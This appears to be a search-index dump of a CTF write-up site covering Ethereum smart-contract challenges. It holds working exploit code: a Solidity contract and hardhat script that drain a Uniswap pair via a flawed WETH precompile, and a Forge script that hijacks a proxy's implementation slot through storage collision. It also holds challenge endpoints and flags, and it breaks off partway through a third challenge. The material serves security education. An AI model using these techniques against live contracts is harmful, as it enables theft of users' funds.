\uff0c\u8c03\u7528\u8005\u5c06\u4e3a\u653b\u51fb\u8005\u5408\u7ea6\uff0c\u56e0\u800c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7406\u8c03\u7528\u6765\u8f6c\u6362\u8c03\u7528\u8005 \u53e6\u5916\uff0c contracts_weth.go \u4e2d\u5b9e\u73b0\u7684 approve \u786c\u7f16\u7801\u4e86\u72b6\u6001\u4fee\u6539\u7684\u76ee\u6807\uff08 realWrappedEtherAddr \uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 func approve ( evm * EVM , caller common . Address , input [] byte , suppliedGas uint64 , readOnly bool ) ( ret [] byte , remainingGas uint64 , err error ) { if evm . interpreter . readOnly { return nil , suppliedGas , ErrWriteProtection } inputArgs := & ApproveInput {} if err = unpackInputIntoInterface ( inputArgs , \"approve\" , input ); err != nil { return nil , suppliedGas , err } return approveInternal ( evm , suppliedGas , caller , inputArgs . Spender , inputArgs . Amount ) } func approveInternal ( evm * EVM , suppliedGas uint64 , owner , spender common . Address , value * big . Int ) ( ret [] byte , remainingGas uint64 , err error ) { if remainingGas , err = deductGas ( suppliedGas , params . Keccak256Gas * 2 ); err != nil { return nil , 0 , err } loc := calculateAllowancesStorageSlot ( owner , spender ) if remainingGas , err = deductGas ( suppliedGas , params . SstoreSetGas ); err != nil { return nil , 0 , err } evm . StateDB . SetState ( realWrappedEtherAddr , loc , common . BigToHash ( value )) return math . PaddedBigBytes ( common . Big1 , common . HashLength ), remainingGas , nil } Exploit \u00b6 Hack.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; interface IUniswapV2Pair { function token0 () external view returns ( address ); function token1 () external view returns ( address ); function swap ( uint256 amount0Out , uint256 amount1Out , address to , bytes calldata data ) external ; function sync () external ; } contract Hack { address public WETH ; address public token ; IUniswapV2Pair public pair ; constructor ( address instance ) payable { require ( msg . value == 1 ); pair = IUniswapV2Pair ( instance ); WETH = pair . token0 (); token = pair . token1 (); } function exploit () public { pair . swap ( 0 , 1 , address ( this ), bytes ( \"1\" )); IERC20 ( WETH ). transferFrom ( address ( pair ), address ( this ), IERC20 ( WETH ). balanceOf ( address ( pair ))); IERC20 ( token ). transferFrom ( address ( pair ), address ( this ), IERC20 ( token ). balanceOf ( address ( pair ))); pair . sync (); } function uniswapV2Call ( address sender , uint256 amount0 , uint256 amount1 , bytes calldata data ) public { bytes memory approveCall = abi . encodeWithSignature ( \"approve(address,uint256)\" , address ( this ), type ( uint256 ). max ); address ( WETH ). delegatecall ( approveCall ); address ( WETH ). delegatecall ( abi . encodeWithSignature ( \"transferAndCall(address,uint256,bytes)\" , token , 0 , approveCall )); IERC20 ( WETH ). transfer ( address ( pair ), 1 ); } } exploit.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 const { ethers } = require ( \"hardhat\" ); async function main () { const Factory = await ethers . getContractFactory ( \"Factory\" ); const factory = await Factory . attach ( process . env . FACTORY_ADDRESS ); console . log ( `isSolved: ${ await factory . isSolved () } ` ); const Hack = await ethers . getContractFactory ( \"Hack\" ); const hack = await Hack . deploy ( await factory . uniswapV2Pair (), { value : 1 }); await hack . deployed (); let tx = await hack . exploit (); await tx . wait (); console . log ( `isSolved: ${ await factory . isSolved () } ` ); } main (). catch (( error ) => { console . error ( error ); process . exitCode = 1 ; }) 1 2 3 4 5 $ npm i $ npx hardhat compile $ export FACTORY_ADDRESS = \"<factory_address>\" # \u7f16\u8f91 hardhat.config.js\uff0c\u914d\u7f6e url \u548c\u8d26\u6237\u79c1\u94a5 $ npx hardhat run scripts/exploit.js --network chall Flag \u00b6 rwctf{pREcOmpilEd_m4st3r_5TolE_mY_M0ney} \u53c2\u8003\u8d44\u6599 \u00b6 Precompiled Contracts and Confidential Assets | by Qtum | Qtum 7. Deploying to a live network | Ethereum development environment for professionals by Nomic Foundation ethereum/go-ethereum \u21a9","title":"realwrap"},{"location":"blockchain/realwrap/#_1","text":"WETH on Ethereum is too cumbersome! I'll show you what is real Wrapped ETH by utilizing precompiled contract, it works like a charm especially when exchanging ETH in a swap pair. And most important, IT IS VERY SECURE! nc 47.254.91.104 20000 faucet: http://47.254.91.104:8080 RPC(geth v1.10.26 with realwrap patch): http://47.254.91.104:8545 realwrap.zip","title":"\u9898\u76ee"},{"location":"blockchain/realwrap/#_2","text":"\u76ee\u6807\u662f\u5c06 UniswapV2Pair \u7684 reserve0 \u548c reserve1 \u6e05\u96f6\uff0c\u5373\u6e05\u7a7a\u5408\u7ea6 UniswapV2Pair \u6301\u6709\u7684 WETH \u548c SimpleToken \u5408\u7ea6 UniswapV2Pair \u4e2d\u7684\u51fd\u6570 swap \u5728\u53c2\u6570 data \u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5c06\u8c03\u7528\u5916\u90e8\u5408\u7ea6\u7684\u51fd\u6570 uniswapV2Call \uff0c\u901a\u8fc7\u53c2\u6570 to \u63a7\u5236\uff0c\u51fd\u6570\u6267\u884c\u5185\u5bb9\u53ef\u81ea\u5b9a\u4e49 \u7531\u4e8e mint \u4e2d\u6c38\u4e45\u9501\u5b9a\u4e86\u4e00\u90e8\u5206\u8d44\u91d1\uff0c\u56e0\u6b64\u5408\u7ea6 UniswapV2Pair \u7684\u4f59\u989d\u59cb\u7ec8\u5c0f\u4e8e totalSupply \uff0c\u65e0\u6cd5\u901a\u8fc7 burn \u6e05\u7a7a\u4f59\u989d WETH \uff08Wrapped Ether\uff0c\u4ee5\u592a\u5e01\u64cd\u4f5c\u5957\u7528 ERC20 \u6807\u51c6\uff09 \u4e0e SimpleToken \u4e0d\u540c\uff0c\u5408\u7ea6\u5730\u5740\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u5408\u7ea6 Factory \u4e2d\u6ca1\u6709\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\uff0c\u7528 web3.eth.getCode \u4e5f\u83b7\u53d6\u4e0d\u5230\u5408\u7ea6\u7684\u5b57\u8282\u7801 \u968f\u540e\u610f\u8bc6\u5230 WETH \u662f\u9884\u7f16\u8bd1\u5408\u7ea6\uff0c\u5e76\u6ce8\u610f\u5230\u4e86\u6587\u4ef6 geth_v1.10.26_precompiled.diff \u9884\u7f16\u8bd1\u5408\u7ea6\u7684\u8c03\u7528\u9700\u8981\u901a\u8fc7\u5185\u8054\u6c47\u7f16\uff0c\u4e0d\u8fc7\u672c\u9898\u5bf9\u9884\u7f16\u8bd1\u5408\u7ea6\u8fdb\u884c\u4e86\u5305\u88c5\uff08 contracts.go \uff09\uff0c\u56e0\u6b64 UniswapV2Pair \u4e2d\u8c03\u7528 WETH \u4e2d\u51fd\u6570\u7684\u65b9\u5f0f\u4e0e SimpleToken \u76f8\u540c \u63a5\u4e0b\u6765\u5206\u6790 contracts_weth.go \uff0c\u4e0e\u6807\u51c6\u7684 IERC20 \u4e0d\u540c\uff0c\u8fd8\u5b9e\u73b0\u4e86\u4e00\u4e2a transferAndCall \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 functions = map [ string ] RunStatefulPrecompileFunc { calculateFunctionSelector ( \"name()\" ): metadata ( \"name\" ), calculateFunctionSelector ( \"symbol()\" ): metadata ( \"symbol\" ), calculateFunctionSelector ( \"decimals()\" ): metadata ( \"decimals\" ), calculateFunctionSelector ( \"balanceOf(address)\" ): balanceOf , calculateFunctionSelector ( \"transfer(address,uint256)\" ): transfer , calculateFunctionSelector ( \"transferAndCall(address,uint256,bytes)\" ): transferAndCall , calculateFunctionSelector ( \"allowance(address,address)\" ): allowance , calculateFunctionSelector ( \"approve(address,uint256)\" ): approve , calculateFunctionSelector ( \"transferFrom(address,address,uint256)\" ): transferFrom , } transferAndCall \u80fd\u591f\u5728\u8f6c\u8d26\u7684\u540c\u65f6\uff0c\u4ee5\u8bbe\u5b9a\u7684\u6570\u636e\uff08 inputArgs.Data \uff09\u8c03\u7528\u63a5\u6536\u8005\u5408\u7ea6 1 \u3002\u82e5\u80fd\u8ba9 UniswapV2Pair \u8c03\u7528 token \u7684 approve \u51fd\u6570\u5c31\u80fd\u591f\u6e05\u7a7a\u5408\u7ea6\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func transferAndCall ( evm * EVM , caller common . Address , input [] byte , suppliedGas uint64 , readOnly bool ) ( ret [] byte , remainingGas uint64 , err error ) { if readOnly { return nil , suppliedGas , ErrWriteProtection } inputArgs := & TransferAndCallInput {} if err = unpackInputIntoInterface ( inputArgs , \"transferAndCall\" , input ); err != nil { return nil , suppliedGas , err } if ret , remainingGas , err = transferInternal ( evm , suppliedGas , caller , inputArgs . To , inputArgs . Amount ); err != nil { return ret , remainingGas , err } code := evm . StateDB . GetCode ( inputArgs . To ) if len ( code ) == 0 { return ret , remainingGas , nil } snapshot := evm . StateDB . Snapshot () evm . depth ++ defer func () { evm . depth -- }() if ret , remainingGas , err = evm . Call ( AccountRef ( caller ), inputArgs . To , inputArgs . Data , remainingGas , common . Big0 ); err != nil { evm . StateDB . RevertToSnapshot ( snapshot ) if err != ErrExecutionReverted { remainingGas = 0 } } return ret , remainingGas , err } \u82e5\u5728 uniswapV2Call \u4e2d\u76f4\u63a5\u4f7f\u7528 transferAndCall \uff0c\u8c03\u7528\u8005\u5c06\u4e3a\u653b\u51fb\u8005\u5408\u7ea6\uff0c\u56e0\u800c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7406\u8c03\u7528\u6765\u8f6c\u6362\u8c03\u7528\u8005 \u53e6\u5916\uff0c contracts_weth.go \u4e2d\u5b9e\u73b0\u7684 approve \u786c\u7f16\u7801\u4e86\u72b6\u6001\u4fee\u6539\u7684\u76ee\u6807\uff08 realWrappedEtherAddr \uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 func approve ( evm * EVM , caller common . Address , input [] byte , suppliedGas uint64 , readOnly bool ) ( ret [] byte , remainingGas uint64 , err error ) { if evm . interpreter . readOnly { return nil , suppliedGas , ErrWriteProtection } inputArgs := & ApproveInput {} if err = unpackInputIntoInterface ( inputArgs , \"approve\" , input ); err != nil { return nil , suppliedGas , err } return approveInternal ( evm , suppliedGas , caller , inputArgs . Spender , inputArgs . Amount ) } func approveInternal ( evm * EVM , suppliedGas uint64 , owner , spender common . Address , value * big . Int ) ( ret [] byte , remainingGas uint64 , err error ) { if remainingGas , err = deductGas ( suppliedGas , params . Keccak256Gas * 2 ); err != nil { return nil , 0 , err } loc := calculateAllowancesStorageSlot ( owner , spender ) if remainingGas , err = deductGas ( suppliedGas , params . SstoreSetGas ); err != nil { return nil , 0 , err } evm . StateDB . SetState ( realWrappedEtherAddr , loc , common . BigToHash ( value )) return math . PaddedBigBytes ( common . Big1 , common . HashLength ), remainingGas , nil }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/realwrap/#exploit","text":"Hack.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 pragma solidity ^ 0.8.17 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; interface IUniswapV2Pair { function token0 () external view returns ( address ); function token1 () external view returns ( address ); function swap ( uint256 amount0Out , uint256 amount1Out , address to , bytes calldata data ) external ; function sync () external ; } contract Hack { address public WETH ; address public token ; IUniswapV2Pair public pair ; constructor ( address instance ) payable { require ( msg . value == 1 ); pair = IUniswapV2Pair ( instance ); WETH = pair . token0 (); token = pair . token1 (); } function exploit () public { pair . swap ( 0 , 1 , address ( this ), bytes ( \"1\" )); IERC20 ( WETH ). transferFrom ( address ( pair ), address ( this ), IERC20 ( WETH ). balanceOf ( address ( pair ))); IERC20 ( token ). transferFrom ( address ( pair ), address ( this ), IERC20 ( token ). balanceOf ( address ( pair ))); pair . sync (); } function uniswapV2Call ( address sender , uint256 amount0 , uint256 amount1 , bytes calldata data ) public { bytes memory approveCall = abi . encodeWithSignature ( \"approve(address,uint256)\" , address ( this ), type ( uint256 ). max ); address ( WETH ). delegatecall ( approveCall ); address ( WETH ). delegatecall ( abi . encodeWithSignature ( \"transferAndCall(address,uint256,bytes)\" , token , 0 , approveCall )); IERC20 ( WETH ). transfer ( address ( pair ), 1 ); } } exploit.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 const { ethers } = require ( \"hardhat\" ); async function main () { const Factory = await ethers . getContractFactory ( \"Factory\" ); const factory = await Factory . attach ( process . env . FACTORY_ADDRESS ); console . log ( `isSolved: ${ await factory . isSolved () } ` ); const Hack = await ethers . getContractFactory ( \"Hack\" ); const hack = await Hack . deploy ( await factory . uniswapV2Pair (), { value : 1 }); await hack . deployed (); let tx = await hack . exploit (); await tx . wait (); console . log ( `isSolved: ${ await factory . isSolved () } ` ); } main (). catch (( error ) => { console . error ( error ); process . exitCode = 1 ; }) 1 2 3 4 5 $ npm i $ npx hardhat compile $ export FACTORY_ADDRESS = \"<factory_address>\" # \u7f16\u8f91 hardhat.config.js\uff0c\u914d\u7f6e url \u548c\u8d26\u6237\u79c1\u94a5 $ npx hardhat run scripts/exploit.js --network chall","title":"Exploit"},{"location":"blockchain/realwrap/#flag","text":"rwctf{pREcOmpilEd_m4st3r_5TolE_mY_M0ney}","title":"Flag"},{"location":"blockchain/realwrap/#_3","text":"Precompiled Contracts and Confidential Assets | by Qtum | Qtum 7. Deploying to a live network | Ethereum development environment for professionals by Nomic Foundation ethereum/go-ethereum \u21a9","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/respectable_nft/","tags":["smart contract","solidity","storage layout","brute force"],"text":"#smart contract #solidity #storage layout #brute force .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 My favorite TikTok influencer told me about a great NFT project that is guaranteed to not be a scam. It even has this cool feature where you can name your token :^) Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; import \"./UpgradeableProxy.sol\" ; import \"./CryptoFlags.sol\" ; contract Setup { CryptoFlags public cryptoFlags ; constructor () payable { UpgradeableProxy proxy = new UpgradeableProxy (); CryptoFlags impl = new CryptoFlags (); proxy . upgradeTo ( address ( impl )); cryptoFlags = CryptoFlags ( address ( proxy )); } function isSolved () public view returns ( bool ) { return cryptoFlags . isSolved (); } } UpgradeableProxy.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; contract UpgradeableProxy { // keccak256(\"owner_storage\"); bytes32 public constant OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb ; // keccak256(\"implementation_storage\"); bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6 ; struct AddressSlot { address value ; } function getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r . slot := slot } } constructor () { AddressSlot storage owner = getAddressSlot ( OWNER_STORAGE ); owner . value = msg . sender ; } function upgradeTo ( address implementation ) external { require ( msg . sender == getAddressSlot ( OWNER_STORAGE ). value , \"Only owner can upgrade\" ); getAddressSlot ( IMPLEMENTATION_STORAGE ). value = implementation ; } function _delegate ( address implementation ) internal { assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy ( 0 , 0 , calldatasize ()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) // Copy the returned data. returndatacopy ( 0 , 0 , returndatasize ()) switch result // delegatecall returns 0 on error. case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } fallback () external payable { _delegate ( getAddressSlot ( IMPLEMENTATION_STORAGE ). value ); } } CryptoFlags.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; import \"./ERC721_flattened.sol\" ; contract CryptoFlags is ERC721 { mapping ( uint256 => string ) public FlagNames ; constructor () ERC721 ( \"CryptoFlags\" , \"CTF\" ) { } function _beforeTokenTransfer ( address from , address to , uint256 tokenId ) internal override virtual { require ( from == address ( 0 ), \"no flag sharing pls :^)\" ); to ; tokenId ; } function setFlagName ( uint256 id , string memory name ) external { require ( ownerOf ( id ) == msg . sender , \"Only owner can name the flag\" ); require ( bytes ( FlagNames [ id ]). length == 0 , \"that flag already has a name\" ); FlagNames [ id ] = name ; } function claimFlag ( uint256 id ) external { require ( id <= 100 _000_000 , \"Only the first 100_000_000 ids allowed\" ); _mint ( msg . sender , id ); } function isSolved () external pure returns ( bool ) { return false ; } } Solution \u00b6 The CryptoFlags is using a proxy, to make isSolved() return true, we have to update the value stored in the implementation slot, since the current logic contract will always return false. There are two possible ways to upgrade the contract, both of which require modifying specific slots in an unauthorized manner: Directly modify the IMPLEMENTATION_STORAGE slot Modify the OWNER_STORAGE slot, then call upgradeTo() to modify the IMPLEMENTATION_STORAGE slot Since mapping FlagNames occupies slot 6, through the setFlagName() function in the CryptoFlags contract, we can modify the storage slot at keccak(abi.encode(id, 6)) or after keccak(uint256(keccak(abi.encode(id, 6)))) , depending on the length of the string. 1 2 3 4 5 6 7 8 9 10 function setFlagName ( uint256 id , string memory name ) external { require ( ownerOf ( id ) == msg . sender , \"Only owner can name the flag\" ); require ( bytes ( FlagNames [ id ]). length == 0 , \"that flag already has a name\" ); FlagNames [ id ] = name ; } function claimFlag ( uint256 id ) external { require ( id <= 100 _000_000 , \"Only the first 100_000_000 ids allowed\" ); _mint ( msg . sender , id ); } If the target slot is at keccak(abi.encode(id, 6)) , we can not modify it because bytes(FlagNames[id]).length is not zero. But it is possible that the target slot is close to keccak(uint256(keccak(abi.encode(id, 6)))) . Luckily, the value of IMPLEMENTATION_STORAGE is not the keccak256 hash of \"implementation_storage\" and CryptoFlags limits the maximum value of id , we can traverse within this range. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from web3 import Web3 from tqdm import tqdm owner_slot = int ( \"6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb\" , 16 ) impl_slot = int ( \"b6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6\" , 16 ) for i in tqdm ( range ( 100_000_001 )): h = Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ i , 6 ]) slot = int ( Web3 . solidity_keccak ([ 'uint256' ], [ int ( h . hex (), 16 )]) . hex (), 16 ) d = owner_slot - slot # the slot where `name` stored should not be too far from the target slot # to avoid reaching the block gas limit if d >= 0 and d <= 10000 : print ( i , h . hex (), hex ( slot ), d ) d = impl_slot - slot if d >= 0 and d <= 10000 : print ( i , h . hex (), hex ( slot ), d ) # Result: 56488061 fd873ebcc46cb76d491c36d05ef9b7b40d72903b955f8c3cc3bfceab0b7eccb7 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766b49 141 The result shows that there is one slot that is only 141 slots away from the IMPLEMENTATION_STORAGE slot. Thus, we can directly modify it and solve the challenge <3 Solve.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import { Script , console } from \"forge-std/Script.sol\" ; import \"src/Setup.sol\" ; contract Solved { function isSolved () external pure returns ( bool ) { return true ; } } contract SolveScript is Script { function run () public virtual { Setup setup = Setup ( vm . envAddress ( \"SETUP\" )); CryptoFlags cryptoFlags = setup . cryptoFlags (); uint256 id = 56488061 ; vm . startBroadcast ( vm . envUint ( \"PRIV\" )); cryptoFlags . claimFlag ( id ); cryptoFlags . setFlagName ( id , string ( abi . encodePacked ( new bytes ( 141 * 32 ), abi . encode ( address ( new Solved ())) ))); vm . stopBroadcast (); require ( setup . isSolved (), \"did not solve :'(\" ); } } Flag \u00b6 hxp{n3v3r_7ru57_pr3c0mpu73d_v4lu35}","title":"respectable_nft"},{"location":"blockchain/respectable_nft/#description","text":"My favorite TikTok influencer told me about a great NFT project that is guaranteed to not be a scam. It even has this cool feature where you can name your token :^) Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; import \"./UpgradeableProxy.sol\" ; import \"./CryptoFlags.sol\" ; contract Setup { CryptoFlags public cryptoFlags ; constructor () payable { UpgradeableProxy proxy = new UpgradeableProxy (); CryptoFlags impl = new CryptoFlags (); proxy . upgradeTo ( address ( impl )); cryptoFlags = CryptoFlags ( address ( proxy )); } function isSolved () public view returns ( bool ) { return cryptoFlags . isSolved (); } } UpgradeableProxy.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; contract UpgradeableProxy { // keccak256(\"owner_storage\"); bytes32 public constant OWNER_STORAGE = 0x6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb ; // keccak256(\"implementation_storage\"); bytes32 public constant IMPLEMENTATION_STORAGE = 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6 ; struct AddressSlot { address value ; } function getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r . slot := slot } } constructor () { AddressSlot storage owner = getAddressSlot ( OWNER_STORAGE ); owner . value = msg . sender ; } function upgradeTo ( address implementation ) external { require ( msg . sender == getAddressSlot ( OWNER_STORAGE ). value , \"Only owner can upgrade\" ); getAddressSlot ( IMPLEMENTATION_STORAGE ). value = implementation ; } function _delegate ( address implementation ) internal { assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy ( 0 , 0 , calldatasize ()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) // Copy the returned data. returndatacopy ( 0 , 0 , returndatasize ()) switch result // delegatecall returns 0 on error. case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } fallback () external payable { _delegate ( getAddressSlot ( IMPLEMENTATION_STORAGE ). value ); } } CryptoFlags.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //SPDX-License-Identifier: Unlicense pragma solidity 0.8.20 ; import \"./ERC721_flattened.sol\" ; contract CryptoFlags is ERC721 { mapping ( uint256 => string ) public FlagNames ; constructor () ERC721 ( \"CryptoFlags\" , \"CTF\" ) { } function _beforeTokenTransfer ( address from , address to , uint256 tokenId ) internal override virtual { require ( from == address ( 0 ), \"no flag sharing pls :^)\" ); to ; tokenId ; } function setFlagName ( uint256 id , string memory name ) external { require ( ownerOf ( id ) == msg . sender , \"Only owner can name the flag\" ); require ( bytes ( FlagNames [ id ]). length == 0 , \"that flag already has a name\" ); FlagNames [ id ] = name ; } function claimFlag ( uint256 id ) external { require ( id <= 100 _000_000 , \"Only the first 100_000_000 ids allowed\" ); _mint ( msg . sender , id ); } function isSolved () external pure returns ( bool ) { return false ; } }","title":"Description"},{"location":"blockchain/respectable_nft/#solution","text":"The CryptoFlags is using a proxy, to make isSolved() return true, we have to update the value stored in the implementation slot, since the current logic contract will always return false. There are two possible ways to upgrade the contract, both of which require modifying specific slots in an unauthorized manner: Directly modify the IMPLEMENTATION_STORAGE slot Modify the OWNER_STORAGE slot, then call upgradeTo() to modify the IMPLEMENTATION_STORAGE slot Since mapping FlagNames occupies slot 6, through the setFlagName() function in the CryptoFlags contract, we can modify the storage slot at keccak(abi.encode(id, 6)) or after keccak(uint256(keccak(abi.encode(id, 6)))) , depending on the length of the string. 1 2 3 4 5 6 7 8 9 10 function setFlagName ( uint256 id , string memory name ) external { require ( ownerOf ( id ) == msg . sender , \"Only owner can name the flag\" ); require ( bytes ( FlagNames [ id ]). length == 0 , \"that flag already has a name\" ); FlagNames [ id ] = name ; } function claimFlag ( uint256 id ) external { require ( id <= 100 _000_000 , \"Only the first 100_000_000 ids allowed\" ); _mint ( msg . sender , id ); } If the target slot is at keccak(abi.encode(id, 6)) , we can not modify it because bytes(FlagNames[id]).length is not zero. But it is possible that the target slot is close to keccak(uint256(keccak(abi.encode(id, 6)))) . Luckily, the value of IMPLEMENTATION_STORAGE is not the keccak256 hash of \"implementation_storage\" and CryptoFlags limits the maximum value of id , we can traverse within this range. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from web3 import Web3 from tqdm import tqdm owner_slot = int ( \"6ec82d6c1818e9fe1ca828d3577e9b2dadd8d4720dd58701606af804c069cfcb\" , 16 ) impl_slot = int ( \"b6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766bd6\" , 16 ) for i in tqdm ( range ( 100_000_001 )): h = Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ i , 6 ]) slot = int ( Web3 . solidity_keccak ([ 'uint256' ], [ int ( h . hex (), 16 )]) . hex (), 16 ) d = owner_slot - slot # the slot where `name` stored should not be too far from the target slot # to avoid reaching the block gas limit if d >= 0 and d <= 10000 : print ( i , h . hex (), hex ( slot ), d ) d = impl_slot - slot if d >= 0 and d <= 10000 : print ( i , h . hex (), hex ( slot ), d ) # Result: 56488061 fd873ebcc46cb76d491c36d05ef9b7b40d72903b955f8c3cc3bfceab0b7eccb7 0xb6753470eb6d4b1c922b6fc73d6f139c74e8cf70d68951794272d43bed766b49 141 The result shows that there is one slot that is only 141 slots away from the IMPLEMENTATION_STORAGE slot. Thus, we can directly modify it and solve the challenge <3 Solve.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; import { Script , console } from \"forge-std/Script.sol\" ; import \"src/Setup.sol\" ; contract Solved { function isSolved () external pure returns ( bool ) { return true ; } } contract SolveScript is Script { function run () public virtual { Setup setup = Setup ( vm . envAddress ( \"SETUP\" )); CryptoFlags cryptoFlags = setup . cryptoFlags (); uint256 id = 56488061 ; vm . startBroadcast ( vm . envUint ( \"PRIV\" )); cryptoFlags . claimFlag ( id ); cryptoFlags . setFlagName ( id , string ( abi . encodePacked ( new bytes ( 141 * 32 ), abi . encode ( address ( new Solved ())) ))); vm . stopBroadcast (); require ( setup . isSolved (), \"did not solve :'(\" ); } }","title":"Solution"},{"location":"blockchain/respectable_nft/#flag","text":"hxp{n3v3r_7ru57_pr3c0mpu73d_v4lu35}","title":"Flag"},{"location":"blockchain/restricted_proxy/","tags":["smart contract","solidity","abi coder"],"text":"#smart contract #solidity #abi coder .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Long, long ago (like... Block 42), a wizard has sealed 1 ETH inside a mystical Proxy Contract. You get one shot to proxy upgrade it\u2014but under these very strict rules: No Messing with the Family Tree The inheritance structure stays exactly as is. No new parents, no secret children. No Rewriting the Magic You can\u2019t alter existing functions or their visibility, and you can\u2019t add or remove any functions. No new spells, no banished spells. No Rearranging the Royal Closet. The storage layout cannot change. Touch a single uint256, and you might awaken the alignment demon. No Upgrading the Wizard\u2019s Quill Keep the same Solidity version. The wizard likes his dusty old version\u2014deal with it. Obey these ancient laws, upgrade the contract once, and claim the 1 ETH prize. But break them and face the dreaded 'Gasless Abyss!' nc 167.99.129.101 1337 Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // SPDX-License-Identifier: MIT pragma solidity 0.8.26 ; import \"src/CTF.sol\" ; contract Challenge { address public immutable PLAYER ; address public immutable ctf ; constructor ( address player ) payable { PLAYER = player ; ctf = address ( new CTF { value : 100 ether }()); } function isSolved () external view returns ( bool ) { return PLAYER . balance >= 100 ether && ctf . balance == 0 ether ; } } CTF.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // SPDX-License-Identifier: MIT pragma solidity 0.8.26 ; contract CTF { bool public ownerWithdrawn ; uint256 public withdrawRate ; address public owner ; uint256 public constant WITHDRAW_DENOMINATOR = 10000 